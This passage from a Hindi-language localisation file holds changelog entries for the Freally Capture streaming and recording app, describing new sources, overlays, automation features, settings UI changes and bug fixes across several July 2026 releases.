एक एक ही नियोजित पास है, golden-frame परीक्षणों के साथ।","changelog.1647ee3fae6b":"<strong>3D / परिप्रेक्ष्य ट्रांसफ़ॉर्म (CAP-N23)</strong> — कोई आइटम 3D में झुक सकता है: ट्रांसफ़ॉर्म संपादित करें में <strong>झुकाव X</strong>, <strong>झुकाव Y</strong> और <strong>परिप्रेक्ष्य</strong> की तीव्रता। सामान्य (बिना झुकाव वाला) ट्रांसफ़ॉर्म पिक्सेल-दर-पिक्सेल पहले जैसा रेंडर होता है — प्रोजेक्टिव मैट्रिक्स सिर्फ़ तब इस्तेमाल होता है जब झुकाव लगाया गया हो।","changelog.ebaba11b62a2":"<strong>फ़्रीज़-फ़्रेम फ़िल्टर (CAP-N25)</strong> — किसी सोर्स में <strong>फ़्रीज़</strong> फ़िल्टर जोड़ें और वह अपना आख़िरी फ़्रेम थामे रखता है; प्रोग्राम, प्रीव्यू, रिकॉर्डिंग और स्ट्रीम सब एक साथ फ़्रीज़ हो जाते हैं। फ़्रीज़ हटाने के लिए इसे फिर से टॉगल करें।","changelog.e1ac0ba4a7ba":"<strong>सोर्स क्लोन (CAP-N26)</strong> — हर सोर्स पंक्ति पर एक <strong>क्लोन</strong> बटन (⧉): एक फ़ीड, कई रूप। एक ही सोर्स कई सीन/जगहों पर रह सकता है, हर आइटम के अपने ट्रांसफ़ॉर्म और फ़िल्टर स्टैक के साथ (इंजन पहले से ही फ़िल्टर को हर आइटम के हिसाब से रखता था; यह उसे एक क्लिक का काम बना देता है)।","changelog.d223f64ff4d4":"<strong>डाउनस्ट्रीम कीयर (CAP-N24)</strong> — <strong>प्रोग्राम आउटपुट</strong> पर, हर सीन के ऊपर कंपोज़ होने वाली स्थायी ओवरले परतें, जो सीन कट के बाद भी बनी रहती हैं (स्टेशन लोगो, लाइव बैज, लोअर-थर्ड)। एक नया <strong>उपकरण → डाउनस्ट्रीम कीयर</strong> पैनल इन्हें संभालता है: कोई भी सोर्स जोड़ें, क्रम बदलें, अपारदर्शिता, स्थिति/आकार, हर परत को चालू/बंद करें। ये प्रीव्यू, रिकॉर्डिंग, स्ट्रीम और मल्टीव्यू में एक समान रेंडर होते हैं।","changelog.c53ca5aa04c7":"<strong>नया क्या है</strong> अब चल रहे बिल्ड का बदलाव लॉग ब्राउज़र टैब के बजाय <strong>ऐप के भीतर</strong> खोलता है (वही सिर्फ़-पढ़ने वाला नोट्स व्यू जो अपडेटर इस्तेमाल करता है) — ऑफ़लाइन, और हमेशा वही नोट्स जो शिप हुए।","changelog.a41f1b775b16":"<strong>स्टैट्स डॉक में डिस्क-स्पेस रीडआउट</strong> — एक लाइव <strong>डिस्क</strong> टाइल रिकॉर्डिंग ड्राइव पर ख़ाली जगह दिखाती है, और रिकॉर्डिंग के दौरान एक <strong>रिकॉर्ड शेष</strong> टाइल मौजूदा लिखने की दर पर ड्राइव भरने तक का समय अनुमानित करती है (वही ईमानदार, <code>.frec</code> को ध्यान में रखने वाला अनुमान जो कम-डिस्क चेतावनी इस्तेमाल करती है)। ताकि रिकॉर्ड या स्ट्रीम करते समय आप देख सकें कि कितनी जगह बची है।","changelog.266a45108853":"<strong>प्रोजेक्टर खोलें पूरे डेस्कटॉप को जाम कर देता था।</strong> किसी डिस्प्ले पर प्रोजेक्टर खोलने पर प्राइमरी डिस्प्ले पर <em>विंडो बनाते समय ही</em> OS से एक्सक्लूसिव फ़ुलस्क्रीन माँगा जाता था, जिससे Windows इवेंट लूप में डेडलॉक हो जाता था — डेस्कटॉप जाम हो जाता था और ऐप को टास्क मैनेजर से बंद करना पड़ता था। अब प्रोजेक्टर <strong>चुने गए मॉनिटर के आकार की एक बिना बॉर्डर वाली विंडो</strong> हैं (OBS का &quot;फ़ुलस्क्रीन प्रोजेक्टर&quot; असल में यही है): DWM मोड में कोई स्विच नहीं, और Esc / Alt+F4 / टास्कबार सब काम करते रहते हैं।","changelog.5f6fa8c04556":"<strong>OBS सीन आयात कैमरा नहीं चुनता था।</strong> OBS से आयात किया गया Video Capture Device &quot;(मौजूदा डिवाइस)&quot; पर आता था और कुछ भी चुना नहीं होता था — आयातक OBS का डिवाइस पूरी तरह छोड़ देता था। अब वह OBS का आसान डिवाइस नाम साथ लाता है और आयात के समय उसे इस मशीन के कैमरे से मिला देता है।","changelog.7dca8f4d0d7f":"[0.301.0] — 2026-07-14 (मेन्यू बार और सेटिंग्स मोडल)","changelog.080821dda5da":"डेस्कटॉप-ऐप का ढाँचा, OBS जैसा पर Freally का अपना: ऊपर एक असली <strong>मेन्यू बार</strong> और ठीक / रद्द करें / लागू करें वाला एक <strong>साइडबार सेटिंग्स मोडल</strong> — ताकि नियंत्रण डॉक फिर से लाइव नियंत्रणों के लिए हो, न कि लॉन्चर बटनों की दीवार।","changelog.8a7238deca0a":"<strong>ऐप्लिकेशन मेन्यू बार</strong> — विंडो के ऊपर फ़ाइल · संपादन · दृश्य · डॉक · प्रोफ़ाइल · सीन कलेक्शन · उपकरण · सहायता। यह पहले से मौजूद क्रियाओं (कमांड पैलेट वाली) के ऊपर सिर्फ़ एक डिस्पैच परत है, इसलिए अंदर कुछ भी नया नहीं होता — लॉन्चरों को बस अब एक ठिकाना मिल गया है। फ़ाइल से रिकॉर्डिंग दिखाएँ / Remux / सेटिंग्स / सेटिंग्स फ़ोल्डर दिखाएँ / बाहर निकलें तक पहुँचा जा सकता है; संपादन में undo-redo और ट्रांसफ़ॉर्म व फ़िल्टर का कॉपी/पेस्ट है; उपकरण में स्वचालन, रनडाउन, हॉटकी मैप, A/V-सिंक, स्क्रिप्ट, कंपोनेंट, MIDI, PTZ, रिमोट API और LAN पैनल एक जगह हैं; प्रोफ़ाइल और सीन कलेक्शन सहेजे गए सेट के बीच स्विच करते हैं; सहायता दस्तावेज़ीकरण, बदलाव लॉग, बग रिपोर्ट और अपडेट जाँच खोलता है। ड्रॉपडाउन कीबोर्ड से चलाए जा सकते हैं (मेन्यू के बीच और भीतर ऐरो कुंजियाँ) और स्क्रीन-रीडर के लिए लेबल किए गए हैं; जो फ़ीचर अभी मौजूद नहीं हैं, उनके आइटम मौजूद हैं पर निष्क्रिय हैं।","changelog.0a8800013b15":"<strong>OBS-शैली का सेटिंग्स मोडल</strong> — श्रेणियों का एक बायाँ साइडबार (<strong>सामान्य · दिखावट · स्ट्रीमिंग · आउटपुट · रीप्ले · हॉटकी · नेटवर्क · सुगम्यता · परिचय</strong>), समूहों में बँटा, स्क्रॉल होने वाला पैन और एक <strong>ठीक / रद्द करें / लागू करें</strong> फ़ुटर। <strong>जब तक आप लागू करें (या ठीक) पर क्लिक नहीं करते, कुछ नहीं बदलता:</strong> मोडल एक निजी कॉपी को संपादित करता है, जब तक आप सचमुच कुछ न बदलें तब तक लागू करें धूसर रहता है, और रद्द करें/Escape ठीक वही वापस ला देता है जो पहले था — थीम और एक्सेंट मोडल खुला रहते हुए लाइव प्रीव्यू होते हैं, पर रद्द करने पर लौट जाते हैं और कोई निशान नहीं छोड़ते। किसी श्रेणी की त्रुटि इनलाइन दिखती है और उसकी साइडबार प्रविष्टि पर एक बिंदु लग जाता है।","changelog.0b27c918454f":"<strong>टकराव-रहित हॉटकी बाइंडिंग</strong> — हॉटकी श्रेणी हर क्रिया को टेक्स्ट बॉक्स से नहीं, बल्कि <strong>चुने हुए शॉर्टकट की ड्रॉपडाउन</strong> से बाँधती है। किसी एक क्रिया के लिए शॉर्टकट चुनने पर वह बाक़ी हर क्रिया के मेन्यू से हट जाता है, इसलिए दो फ़ीचर कभी एक ही कुंजी नहीं रख सकते; <strong>कोई नहीं</strong> बाइंडिंग हटाता है और कुंजी को फिर से सूची में लौटा देता है। एक फ़िल्टर बॉक्स सूची को छोटा करता है। मुक्त टेक्स्ट प्रविष्टि पूरी तरह हटा दी गई है, और बैकएंड अब ग़लत ढंग से बने accelerator को संरचना के स्तर पर ही अस्वीकार करता है, इसलिए हाथ से संपादन करके भी कोई बेतुकी बाइंडिंग सहेजी नहीं जा सकती।","changelog.757f7265a0b3":"<strong>सुगम्यता: मिक्सर मीटर के रंग</strong> — नई सुगम्यता श्रेणी VU-मीटर के बैंड के रंग तय करती है, डिफ़ॉल्ट और कस्टम विकल्प के साथ-साथ एक <strong>रंग-अंधता के लिए सुरक्षित प्रीसेट</strong> (Okabe-Ito) भी।","changelog.bc44a26e0073":"<strong>डेस्कटॉप शॉर्टकट फ़ोल्डर</strong> — फ़ाइल → रिकॉर्डिंग दिखाएँ / सेटिंग्स फ़ोल्डर दिखाएँ ऐप के अपने फ़ोल्डर फ़ाइल ब्राउज़र में खोलते हैं (ऐप का अपना कमांड, webview से आया कोई कच्चा पाथ कभी नहीं)।","changelog.a8559338a320":"<strong>नियंत्रण डॉक अब सिर्फ़ नियंत्रणों के लिए है।</strong> डायलॉग खोलने वाले सभी 18 बटन (सेटिंग्स, आउटपुट, स्ट्रीम, डॉक, प्रोफ़ाइल, स्क्रिप्ट, स्वचालन, बग रिपोर्ट करें, अपडेट जाँचें, …) मेन्यू बार में चले गए; डॉक में सिर्फ़ वही रहता है जो प्रसारण चलाता है — रिकॉर्डिंग शुरू/बंद करें, लाइव जाएँ, रीप्ले सक्रिय करें, पैनिक बटन, स्टूडियो मोड, ट्रांज़िशन। क्रैश-रिपोर्ट और अपडेट-उपलब्ध वाले प्रॉम्प्ट लॉन्च पर ठीक पहले की तरह ही दिखते हैं।","changelog.2ce026bd331e":"[0.300.1] — 2026-07-14 (चरण 2 का simplify पास)","changelog.82f024d54659":"कोई नया फ़ीचर नहीं: 0.300.0 के बदलावों की चार कोणों से सफ़ाई-समीक्षा (दोबारा इस्तेमाल / सरलीकरण / दक्षता / स्तर), लागू की गई। एक दिखने वाला सुधार भी साथ आया: <strong>इनपुट ओवरले का फ़ेस कंपोज़िटर</strong> अब भी सुधार से पहले वाला अल्फ़ा ब्लेंड इस्तेमाल करता था, इसलिए पारदर्शिता पर बने ग्लिफ़ के किनारे थोड़े गहरे दिखते थे — अब यह हर दूसरे फ़ेस सोर्स के साथ सुधरा हुआ <code>compose::blit</code> साझा करता है।","changelog.5d482d56004f":"<strong>जो 0.300.0 ने बनाया और फिर दरकिनार कर दिया, वह अब साझा है।</strong> हाथ से लिखे गए चार अल्फ़ा blit अब एक ही कंपोज़िटर को बुलाते हैं; सीक क्लैम्प, ऑडियो-सैंपल डिकोड और चाइल्ड-प्रोसेस वॉचडॉग अब <code>media.rs</code> में एक ही जगह हैं (मीडिया, प्लेलिस्ट, रीप्ले और LAN इनजेस्ट सभी इन्हें अपनाते हैं); चार कमज़ोर सत्र रजिस्ट्रियाँ अब एक <code>WeakRegistry</code> हैं; <code>{{variable}}</code> व्याकरण अब टाइटल और स्वचालन इंजन के बीच साझा किया गया एक ही फ़ंक्शन है (वे अब अलग-अलग नहीं भटक सकते); LAN-इनजेस्ट फ़ॉर्म, QR रेंडरर, टाइटल-लेयर डिफ़ॉल्ट और विकल्प तालिकाएँ एक-एक साझा UI मॉड्यूल हैं; LAN IP प्रोब, Link सेंडर का JPEG एनकोडर और प्लेलिस्ट का शफ़ल, सभी अपनी कॉपी रखने के बजाय पहले से मौजूद हेल्पर को बुलाते हैं।","changelog.9f9c71653770":"<strong>रीयल-टाइम स्वच्छता।</strong> मिक्सर का विज़ुअलाइज़र टैप अब हर 10 ms ब्लॉक पर मेमोरी आवंटित नहीं करता; Freally Link सेंडर हर JPEG प्रोग्राम फ़्रेम को एक बीच वाले बफ़र में कॉपी करने के बजाय फ़्रेम को पहले हेडर, फिर पेलोड के रूप में लिखता है; स्प्लिट टाइमर अपना तुलना कॉलम हर रीपेंट पर नहीं, हर सत्र में एक बार गिनता है; LAN-इनजेस्ट स्थिति जाँच ने हर निकाले गए फ़्रेम पर सोर्स id को फिर से स्ट्रिंग में बदलना बंद कर दिया है।","changelog.b393d51bd0f8":"कई तरह की बेकार सतह हटाई गई (एक न पढ़ा जाने वाला गेमपैड फ़ील्ड, अप्रयुक्त derive, ज़रूरत से ज़्यादा सार्वजनिक हेल्पर) और डिकोड मॉड्यूल के भीतर ffmpeg आर्ग्युमेंट की शुरुआती पंक्तियों/प्रोब का दोहराव हटाया गया — कमांड बाइट-दर-बाइट वही, बस एक ही जगह लिखे गए।","changelog.b1d50dd41d90":"<strong>Windows इंस्टॉलर अब डेस्कटॉप शॉर्टकट बनाता है।</strong> Tauri का NSIS टेम्पलेट सिर्फ़ स्टार्ट मेन्यू प्रविष्टि बनाता है और डेस्कटॉप शॉर्टकट का कोई विकल्प नहीं देता, इसलिए किसी भी इंस्टॉल ने कभी डेस्कटॉप पर आइकन नहीं रखा — अब इंस्टॉलर हुक हर इंस्टॉल पर <code>Freally Capture.lnk</code> (ऐप के अपने आइकन के साथ) बनाते हैं और अनइंस्टॉल पर उसे हटा देते हैं।","changelog.45faf29e220b":"<strong>संरेखण गाइड अब एक क्लिक में हटाए जा सकते हैं।</strong> गाइड हटाने का मतलब था 1-पिक्सेल की रेखा को कैनवस से बाहर खींचना — बारीकी का काम, जिसमें चूकने पर उसकी जगह किसी आइटम को खींचना शुरू हो जाता था (जिसकी मैजेंटा स्नैप रेखाएँ फिर ऐसी लगती थीं मानो &quot;एक नया गाइड आ गया&quot; — यह एक असली रिपोर्ट थी)। गाइड टूलबार में एक <strong>सभी गाइड हटाएँ</strong> बटन जुड़ गया है, और हर गाइड के आसपास पकड़ने की जगह चौड़ी कर दी गई है।","changelog.cb705b484db4":"[0.300.0] — 2026-07-14 (नए सोर्स और ओवरले — CAP-N चरण 2)","changelog.3d36dd2cf7da":"<strong>कैनवस पर रखने के लिए दस नई चीज़ें — सब लोकल।</strong> इंस्टेंट रीप्ले बफ़र को सीधे शो <em>में</em> चला देता है, बिना अंतराल वाली मीडिया प्लेलिस्ट &quot;एक बार में एक फ़ाइल&quot; वाले मीडिया सोर्स की जगह लेती है, टाइटल और स्कोरबोर्ड को लाइव नियंत्रण वाला असली परतदार डिज़ाइनर मिलता है, और कैनवस में एक ऑडियो विज़ुअलाइज़र, एक प्रदर्शन HUD, एक स्पीडरन स्प्लिट टाइमर, एक इनपुट ओवरले और कर्सर प्रभाव जुड़ते हैं। दो LAN सोर्स इसे पूरा करते हैं: एक SRT/RTMP लिसनर, ताकि कोई फ़ोन या दूसरा PC किसी सीन को फ़ीड दे सके, और <strong>Freally Link</strong>, एक इंस्टेंस से दूसरे इंस्टेंस तक साझा करने का ऐप का अपना तरीका, जिसके लिए किसी भी तरफ़ ffmpeg की ज़रूरत नहीं।","changelog.a446e2cc5c22":"<strong>नेटवर्क का नियम कायम रहता है:</strong> दोनों LAN फ़ीचर <strong>तब तक बंद हैं जब तक आप उन्हें जोड़ते नहीं</strong>, सिर्फ़ लोकल मशीन पर bind होते हैं, और इंटरनेट को कभी नहीं छूते। न कुछ खोजता है, न कुछ बाहर कॉल करता है, और ऐप यह बात हर भाषा में बताता है। इनपुट ओवरले और कर्सर प्रभाव इनपुट <strong>सिर्फ़ चालू रहने पर</strong> पढ़ते हैं और कभी कोई कीस्ट्रोक लॉग या सहेजते नहीं।","changelog.69585a9a3335":"<strong>इंस्टेंट-रीप्ले प्लेबैक सोर्स</strong> (CAP-N10)। सक्रिय रीप्ले बफ़र को सीधे प्रोग्राम में चलाएँ: एक हॉटकी आख़िरी N सेकंड का स्नैपशॉट लेती है (stream copy — कोई री-एनकोड नहीं) और उन्हें 100 / 50 / 25 % पर चलाती है, <strong>समय बदलकर, कभी फ़्रेम-इंटरपोलेशन से नहीं</strong>। चलते समय आगे-पीछे करें और रोकें; अंत में सोर्स फिर से पारदर्शी हो जाता है, इसलिए शो अपने-आप लाइव पर लौट आता है। <em>धीमी गति जान-बूझकर बिना आवाज़ की है — समय बदली हुई आवाज़ बिगड़कर फैल जाती, और हम उसे नकली तरीके से नहीं बनाते।</em>","changelog.beabb5e2e26f":"<strong>LAN इनजेस्ट सोर्स</strong> (CAP-N11)। एक बिल्ट-इन <strong>SRT/RTMP लिसनर</strong>: किसी भी फ़ोन कैमरा ऐप, एनकोडर या दूसरे PC को उस URL पर लगाएँ (QR कोड के साथ दिखाया जाता है), और वह अपनी मिक्सर स्ट्रिप के साथ एक सीन में आ जाता है। जोड़े जाने तक बंद, सिर्फ़ लोकल मशीन पर bind, इंटरनेट पर कभी नहीं। SRT एक वैकल्पिक पासफ़्रेज़ (AES) रखता है; <em>RTMP का अपना कोई प्रमाणीकरण नहीं है — फ़ॉर्म यह बताता है और SRT को प्राथमिकता देता है।</em>","changelog.26a004c0fb53":"<strong>Freally Link</strong> (CAP-N12)। एक ही LAN पर दो Freally इंस्टेंस: भेजने वाली मशीन पर Link आउटपुट चालू करें और उसकी <strong>पेयरिंग कुंजी</strong> सेट करें (कुंजी के बिना आउटपुट चालू नहीं किया जा सकता), पाने वाली मशीन पर <strong>LAN स्कैन करें</strong> दबाएँ, कुंजी टाइप करें, और प्रोग्राम एक सोर्स के रूप में दिख जाता है — गेमिंग PC से एनकोडिंग PC तक, या ओवरफ़्लो-रूम का मॉनिटर। जो रिसीवर कुंजी नहीं दे सकता, उसे कभी एक भी फ़्रेम नहीं दिखता (constant-time तुलना, और दोबारा कोशिश के लूप के बजाय एक ईमानदार &quot;अस्वीकृत&quot; त्रुटि)। ऐप का अपना, हाथ से लिखा wire प्रोटोकॉल और mDNS खोज: <strong>किसी भी तरफ़ ffmpeg की ज़रूरत नहीं</strong>, न कोई ब्रोकर, न कोई सर्वर।","changelog.d57b39d01af7":"<strong>इनपुट ओवरले सोर्स</strong> (CAP-N13)। चार लेआउट (WASD, कॉम्पैक्ट कीबोर्ड, डुअल-स्टिक पैड, 8-दिशा फ़ाइट स्टिक) के साथ कीबोर्ड, माउस और गेमपैड का लाइव विज़ुअलाइज़ेशन — दबाई गई कुंजियाँ जल उठती हैं, क्लिक चमकते हैं, स्टिक और ट्रिगर हिलते हैं। <strong>इनपुट सिर्फ़ तभी पढ़ा जाता है जब सोर्स चालू हो, और कभी कुछ लॉग या सहेजा नहीं जाता।</strong> कीबोर्ड/माउस पहले Windows पर हैं (ऐप में यह ईमानदारी से बताया गया है); गेमपैड तीनों OS पर काम करते हैं।","changelog.230d75e66779":"<strong>सिस्टम-स्टैट्स ओवरले सोर्स</strong> (CAP-N14)। स्टैट्स डॉक के <em>असली मापे गए आँकड़े</em> — fps, CPU, मेमोरी, GPU कंपोज़ समय, छूटे फ़्रेम और लाइव बिटरेट — आपके दर्शकों के लिए कंपोज़ किए जाते हैं, हर पंक्ति के टॉगल के साथ। <em>GPU उपयोग जान-बूझकर नहीं दिखाया गया: हम उसे मापते नहीं, इसलिए अंदाज़ा भी नहीं लगाते।</em>","changelog.7d975b57ccd9":"<strong>ऑडियो विज़ुअलाइज़र सोर्स</strong> (CAP-N15)। क्लासिक FFT स्पेक्ट्रम बार, ऑसिलोस्कोप या स्टीरियो VU मीटर, जिन्हें किसी भी मिक्सर स्ट्रिप, ट्रैक बस या मास्टर मिक्स से जोड़ा जा सकता है। <strong>fader के बाद</strong> से लिया जाता है — म्यूट किया गया सोर्स सपाट दिखता है, ठीक वैसा ही जैसा वह सुनाई देता है। ऐप का अपना radix-2 FFT; कहीं भी ML नहीं।","changelog.dcc7f22ee0b8":"<strong>टाइटल और स्कोरबोर्ड डिज़ाइनर</strong> (CAP-N16)। परतदार टेम्पलेट (टेक्स्ट, इमेज, आकार), आउटलाइन और ड्रॉप-शैडो वाले टेक्स्ट के साथ, अंदर/बाहर आने का एनिमेशन (फ़ेड, स्लाइड, वाइप), किसी निगरानी वाली फ़ाइल (CSV सेल, JSON पॉइंटर) या स्टूडियो वेरिएबल से जुड़े फ़ील्ड, और लाइव नियंत्रण — नाम बदलें, स्कोर संपादित करें, एनिमेशन चलाएँ — सीन को छुए बिना।","changelog.977703b6d007":"<strong>मीडिया प्लेलिस्ट सोर्स</strong> (CAP-N17)। एक क्रमबद्ध प्लेलिस्ट जो <strong>सचमुच बिना अंतराल के</strong> चलती है (पूरी ट्रिम की हुई सूची एक ही डिकोड से गुज़रती है, इसलिए आइटम की सीमाएँ फ़्रेम तक सटीक होती हैं), हर आइटम के इन/आउट ट्रिम और cue पॉइंट, लूप / शफ़ल / आख़िरी पर रुके रहना, अगला-पिछला हॉटकी, और एक &quot;अभी चल रहा है&quot; वेरिएबल के साथ जिसे कोई भी टेक्स्ट सोर्स दिखा सकता है।","changelog.ded0bd268198":"<strong>स्पीडरन स्प्लिट टाइमर सोर्स</strong> (CAP-N18)। एक LiveSplit <code>.lss</code> फ़ाइल आयात करें और उसे चलाएँ: पर्सनल बेस्ट, सबसे अच्छे सेगमेंट या औसत से तुलना, गोल्ड-सेगमेंट हाइलाइट, और ग्लोबल split / undo / skip / reset हॉटकी। फ़ाइल <strong>सिर्फ़</strong> पढ़ी जाती है — रन कभी वापस नहीं लिखा जाता। <em>प्रोसेस-मेमोरी वाले ऑटो-स्प्लिटर जान-बूझकर समर्थित नहीं हैं (anti-cheat से निकटता); स्प्लिट फ़ाइल और हॉटकी से होते हैं।</em>","changelog.c303cbf74e59":"<strong>कर्सर हाइलाइट और क्लिक प्रभाव</strong> (CAP-N19)। एक कर्सर हेलो, रंगों से अलग पहचानी जाने वाली बाएँ/दाएँ क्लिक तरंगें, और डिस्प्ले व विंडो कैप्चर पर बनाए जाने वाले वैकल्पिक कुंजी संकेत — ट्यूटोरियल बनाने वालों के लिए बुनियादी ज़रूरत, ऐप के अपने कर्सर पाथ पर। ईमानदारी से कहें तो सिर्फ़ Windows पर (macOS और Linux अपना कर्सर ख़ुद कंपोज़ करते हैं); कीस्ट्रोक बनाए जाते हैं, कभी लॉग नहीं किए जाते।","changelog.f998b484bc62":"<strong>Sharp-bilinear स्केलिंग सामान्य bilinear से ज़्यादा धुँधली थी</strong> (0.200.0 के CAP-N70 में रिग्रेशन)। शेडर टेक्सल के केंद्र के बजाय उनके <em>किनारे</em> मापता था, इसलिए हर टेक्सल का ज़्यादातर हिस्सा 50/50 सीमा-मिश्रण पर पड़ता था। अब यह हर टेक्सल के केंद्र को थामे रखता है और सिर्फ़ एक संकरी सीवन के भीतर पड़ोसी टेक्सल तक जाता है — यह मोड इसी के लिए है। हर स्केलर के लिए नए golden-frame परीक्षण (जो 0.200.0 से बाक़ी थे) इसे पक्का करते हैं।","changelog.e64eb694c7c5":"पैकेजिंग नोट","changelog.7a371e20c4e6":"<strong>Windows MSI के भीतर ProductVersion <code>0.230.0</code> दर्ज है।</strong> Windows Installer MSI के माइनर संस्करण को 255 पर सीमित करता है, जिसे 0.300.0 वाला चरण पार कर जाता है — यह पहली रिलीज़ है जहाँ &quot;हर चरण पर +100&quot; वाली योजना उस सीमा से टकराती है। मैपिंग <code>MSI minor = 200 + app-minor ÷ 10</code> है (0.400.0 → <code>0.240.0</code> … 0.900.0 → <code>0.290.0</code>, फिर 1.0.0 → <code>1.0.0</code>), जो लगातार बढ़ती है ताकि MSI अपग्रेड पुराने इंस्टॉल को बदलते रहें। सिर्फ़ MSI का आंतरिक संस्करण अलग है: ऐप, NSIS इंस्टॉलर, अपडेटर और परिचय, सभी <strong>0.300.0</strong> बताते हैं।","changelog.04f0b1865198":"[0.200.0] — 2026-07-13 (स्वचालन + कैप्चर और डिवाइस की गहराई — CAP-N चरण 1 और 9)","changelog.685bf42fe455":"एक ही रिलीज़ में दो विषय-आधारित चरण, इसलिए संस्करण दो पायदान पार करता है (0.99.0 → 0.200.0)। <strong>चरण 1 — स्वचालन</strong> स्टूडियो को ख़ुद चलने वाला बनाता है: एक नियम इंजन, वेरिएबल वाले मैक्रो, MIDI और OSC कंट्रोल सरफ़ेस, हॉटकी कॉर्ड और लेयर, एक LAN टच पैनल, एक टैली-लाइट सेवा, PTZ कैमरा नियंत्रण, और समयबद्ध शो रनडाउन। <strong>चरण 9 — कैप्चर और डिवाइस की गहराई</strong> ग्लास से कैनवस तक का रास्ता पूरा करता है: कम-लेटेंसी पासथ्रू मॉनिटर, पिक्सेल-परफ़ेक्ट स्केलिंग, पंच-इन ज़ूम, काली पट्टियों का अपने-आप क्रॉप, विंडो↔ऐप-ऑडियो का अपने-आप जुड़ना, और HDR→SDR टोन-मैपिंग। इस चक्र में पहले बनी <strong>सीन पृष्ठभूमि</strong> और <strong>असली उलटे मीडिया प्लेबैक</strong> के साथ शिप होता है।","changelog.79232fa7e8c0":"<strong>पूरी स्वचालन सतह एक ही डिज़ाइन नियम साझा करती है:</strong> हर नियम, मैक्रो, MIDI पैड, OSC पता, पैनल बटन और रनडाउन चरण एक ही निश्चित कमांड allowlist से होकर भेजा जाता है — वही जो WebSocket रिमोट API उपलब्ध कराता है। कोई भी कंट्रोल सरफ़ेस <strong>बनावट से ही</strong> न किसी फ़ाइल का नाम ले सकता है, न कोई प्रोसेस शुरू कर सकता है, न इंटरनेट तक पहुँच सकता है, और हर नेटवर्क सतह डिफ़ॉल्ट रूप से बंद है और loopback पर bind होती है, जब तक LAN को स्पष्ट रूप से चालू न किया जाए।","changelog.9bb9593116bc":"<strong>सीन पृष्ठभूमि / वॉलपेपर।</strong> कोई भी इमेज, लूप होता GIF या लूप होता वीडियो कैप्चर के पीछे पूरे कैनवस या आधी स्क्रीन (बाएँ / दाएँ / ऊपर / नीचे) की पृष्ठभूमि के रूप में पिन करें, और कैप्चर अपने-आप दूसरे आधे हिस्से में बैठ जाता है। कैप्चर या पृष्ठभूमि पर माउस-व्हील से ज़ूम, एक रीयल-टाइम फ़्लिप फ़िल्टर, रिकॉर्डिंग से पहले के प्रीव्यू के साथ &quot;रिकॉर्डिंग शुरू होने तक रोके रखें&quot; मोड, और एक छिपाएँ/दिखाएँ टॉगल, ताकि कैप्चर लौटने से पहले कोई ट्यूटोरियल वीडियो पूरे फ़्रेम में चल सके।","changelog.3cc0eae313a7":"<strong>असली उलटा मीडिया प्लेबैक + पूरा ट्रांसपोर्ट।</strong> एक असली उलटा रेंडर (सीमित मेमोरी, खंडों में, कैश किया हुआ) और साथ में आगे-पीछे खिसकाना, कहीं से भी सीक, चलाएँ/रोकें, और एक लूप टॉगल — पृष्ठभूमि वीडियो ऑपरेटर के इशारे पर एक सामान्य प्लेयर की तरह व्यवहार करता है।","changelog.e9af708a1747":"<strong>स्वचालन नियम इंजन</strong> (CAP-N01)। नौ edge-triggered ट्रिगर — सीन स्विच, स्ट्रीम की स्थिति, रिकॉर्डिंग की स्थिति, सोर्स त्रुटि, ऑडियो स्तर का किसी सीमा को पार करना, सिस्टम निष्क्रियता, विंडो फ़ोकस, दिन का समय, और किसी निगरानी वाली फ़ाइल का बदलना — जो शर्तों (कोई वेरिएबल बराबर है, स्ट्रीमिंग, रिकॉर्डिंग) से नियंत्रित होकर स्टूडियो क्रियाएँ चलाते हैं। हर नियम <strong>निष्क्रिय</strong> शिप होता है; जब तक कोई एक चालू न हो, इंजन कुछ नहीं करता।","changelog.cdab0d32015e":"<strong>मैक्रो, वेरिएबल और अनुक्रम</strong> (CAP-N02)। नामित चरण-अनुक्रम (कोई क्रिया चलाएँ, प्रतीक्षा करें, वेरिएबल सेट करें), दोहराव की गिनती और वैकल्पिक ग्लोबल हॉटकी के साथ, जिन्हें UI, हॉटकी, किसी नियम या रिमोट API से चलाया जा सकता है। स्टूडियो <strong>वेरिएबल</strong> <code>{{name}}</code> को किसी भी टेक्स्ट सोर्स में भरते हैं और जैसे ही कोई मैक्रो मान सेट करता है, उसे लाइव अपडेट कर देते हैं।","changelog.d7decf42ec57":"<strong>MIDI कंट्रोल सरफ़ेस</strong> (CAP-N03)। किसी पैड, नॉब या फ़ेडर को MIDI-learn से किसी स्टूडियो क्रिया, मैक्रो, सीन स्विच, मिक्सर फ़ेडर या म्यूट से जोड़ें, <strong>LED और मोटर-फ़ेडर फ़ीडबैक</strong> के साथ जो स्टूडियो की असली स्थिति दिखाता है (REC पैड इसलिए जलता है क्योंकि आप रिकॉर्ड कर रहे हैं)। जब तक कोई MIDI पोर्ट चुना न जाए, कोई पोर्ट नहीं खुलता।","changelog.3f509d62695d":"<strong>OSC नियंत्रण</strong> (CAP-N04)। TouchOSC जैसे कंट्रोलर और लाइटिंग डेस्क Open Sound Control के ज़रिए स्टूडियो चलाते हैं — <code>/scene/switch</code>, <code>/record/start</code>, <code>/macro/run</code>, <code>/mixer/vol</code> और भी बहुत कुछ। डिफ़ॉल्ट रूप से बंद, LAN चालू न हो तो loopback। <em>OSC का अपना कोई प्रमाणीकरण नहीं है — LAN टॉगल यह बताता है।</em>","changelog.e19b0ee81809":"<strong>हॉटकी कॉर्ड और लेयर</strong> (CAP-N05)। दो-चरण वाले कॉर्ड (<code>Ctrl+K, 3</code>), जिनमें अकेली दूसरी कुंजी सिर्फ़ तब पकड़ी जाती है जब कॉर्ड अधूरा हो, साथ में स्थायी लेयर, ताकि एक छोटा कीबोर्ड कई क्रियाएँ चला सके।","changelog.012efed7e76a":"<strong>LAN टच पैनल</strong> (CAP-N06)। ऐप नेटवर्क पर मौजूद किसी भी फ़ोन को एक कंट्रोल पेज देता है — लाइव टैली वाले सीन बटन, मिक्सर फ़ेडर और क्रिया कुंजियाँ — जिस तक QR कोड से पहुँचा जाता है। डिफ़ॉल्ट रूप से बंद, हर अनुरोध पर पासवर्ड, LAN चालू न हो तो loopback, और पेज एम्बेड किया हुआ है (इंटरनेट से कुछ भी नहीं लाया जाता)।","changelog.6784a15679f3":"<strong>टैली लाइट सेवा</strong> (CAP-N07)। पूरी स्क्रीन वाला एक लाल/हरा टैली पेज, जिसे कोई भी फ़ालतू पड़ा फ़ोन दिखा सकता है; <code>?scene=NAME</code> एक सीन पर नज़र रखता है, वरना यह प्रोग्राम की लाइव स्थिति को ट्रैक करता है।","changelog.0b65086c92dd":"<strong>PTZ कैमरा नियंत्रण</strong> (CAP-N08)। 